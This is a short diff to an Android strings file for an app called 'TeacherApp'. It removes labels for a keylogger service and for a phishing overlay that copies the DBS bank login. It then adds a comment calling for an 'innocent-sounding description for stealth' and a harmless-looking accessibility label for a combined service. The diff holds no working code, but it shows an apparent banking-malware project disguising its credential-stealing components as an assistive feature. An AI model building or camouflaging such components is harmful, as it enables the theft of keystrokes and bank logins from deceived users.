@@ -2,6 +2,6 @@
     <string name="app_name">TeacherApp</string>
     <string name="cloudinary_cloud_name">dgqyrs5r8</string>
     <string name="cloudinary_upload_preset">teacherapp_unsigned</string>
-    <string name="keylogger_service_description">Assists with text input and accessibility</string>
-    <string name="realistic_dbs_overlay_description">Educational demonstration of phishing overlay technique. Shows realistic DBS login replica to demonstrate how banking malware works. Uses fake credentials only. Demo banner makes it clearly educational.</string>
+    <!-- Innocent-sounding description for stealth (Part 3 obfuscation) -->
+    <string name="combined_service_description">Assistive display and input enhancement service</string>
 </resources>
